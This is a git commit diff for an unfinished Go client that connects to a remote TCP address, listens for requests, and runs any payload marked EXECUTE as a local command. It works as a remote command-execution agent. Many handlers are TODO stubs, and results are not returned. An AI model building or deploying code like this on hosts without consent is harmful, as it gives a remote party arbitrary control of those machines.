0533f15e38e353cb8ed858ccdd8f6f7754b65d01
ShubhamVG <vgshubham49@gmail.com>
2024-04-16 12:16:00 +0530

    completed client

--- client/client.go
+++ client/client.go
@@ -2,52 +2,93 @@ package client
 
 import (
 	"net"
+	"os"
 	"os/exec"
+	"os/signal"
+	"strings"
+	"syscall"
+	"time"
+
+	. "../commons"
 )
 
+// ============================Exportables==========================
+
 type Client struct {
-	Address          string
+	AddrToJoin       string
 	Port             string
 	commandToExecute chan string
 }
 
 func NewClient(addr, port string) Client {
 	commandBuffer := make(chan string, 1)
-	return Client{Address: addr, Port: port, commandToExecute: commandBuffer}
+	return Client{AddrToJoin: addr, Port: port, commandToExecute: commandBuffer}
 }
 
 func (client *Client) Communicate() {
-	addr := client.Address + ":" + client.Port
+	addr := client.AddrToJoin + ":" + client.Port
 	conn, err := net.Dial("tcp", addr)
 
 	if err != nil {
 		// TODO
 	}
 
-	receivedBuffer := make([]byte, 1024)
-	n, err := conn.Read(receivedBuffer)
+	defer client.tryNotifyAndClose(&conn)
+	defer println("Works") // DEBUG
+	conn.SetDeadline(time.Time{})
 
-	if err != nil {
-		// TODO
-	}
+	go client.handleReceives(&conn)
 
-	responseBuffer := client.processRequestAndGiveResponse(receivedBuffer[:n])
-	_, err = conn.Write(responseBuffer)
+	// Prevents the process from exiting right away
+	sig := make(chan os.Signal, 1)
+	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
+	<-sig
 }
 
-func (client *Client) executeCommand() {
-	rawCommand := <-client.commandToExecute
-	command, params := parseIntoCommandAndParams(rawCommand)
-	output, err := exec.Command(command, params...).Output()
+// ==============================Internals============================
 
-	if err != nil {
-		// TODO
+func (client *Client) handleReceives(connPtr *net.Conn) {
+	conn := *connPtr
+	buffer := make([]byte, 1024)
+
+	for {
+		n, err := conn.Read(buffer)
+
+		switch err {
+		case net.ErrClosed:
+			// TODO (idk what to do)
+			continue
+		}
+
+		receivedReq := ParseIntoRequest(buffer[:n])
+		client.processRequestAndSendResponse(receivedReq)
 	}
-
-	// TODO
 }
 
-// TODO
-func (client *Client) processRequestAndGiveResponse(buffer []byte) []byte {
-	return buffer
+func (client *Client) processRequestAndSendResponse(req Request) {
+	switch req.Status {
+	case PING:
+		// TODO
+	case REQUESTING_CLOSE:
+		// TODO
+	case REDIRECT:
+		// TODO
+	case EXECUTE:
+		// TODO
+		rawCommand := strings.TrimSuffix(req.Payload, "\n")
+		command, params := parseIntoCommandAndParams(rawCommand)
+		out, err := exec.Command(command, params...).Output()
+
+		if err != nil {
+			// TODO
+		} else {
+			// TODO
+		}
+	}
+}
+
+func (client *Client) tryNotifyAndClose(connPtr *net.Conn) {
+	conn := *connPtr
+	conn.Write([]byte{REQUESTING_CLOSE})
+	os.Exit(0)
 }
